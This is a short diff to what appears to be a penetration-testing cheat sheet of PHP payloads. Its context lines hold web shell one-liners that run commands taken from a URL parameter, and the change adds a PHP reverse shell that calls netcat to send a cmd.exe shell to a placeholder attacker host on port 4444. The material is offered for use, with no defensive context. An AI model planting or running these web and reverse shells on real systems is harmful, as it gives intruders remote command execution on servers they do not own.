@@ -5,6 +5,13 @@ PHP
 <?php system($_GET["cmd"]); ?>
 <?php echo shell_exec($_GET["cmd"]); ?>
 
+#Simple php revers shell.  -e option if you don't have a working /bin/sh. -c string specify shell commands to exec after connect
+
+
+<?php
+system('nc.exe -e cmd.exe attacker_ip 4444')
+?>
+
 -----------------------------------------------------
 Reverse Shell 
 
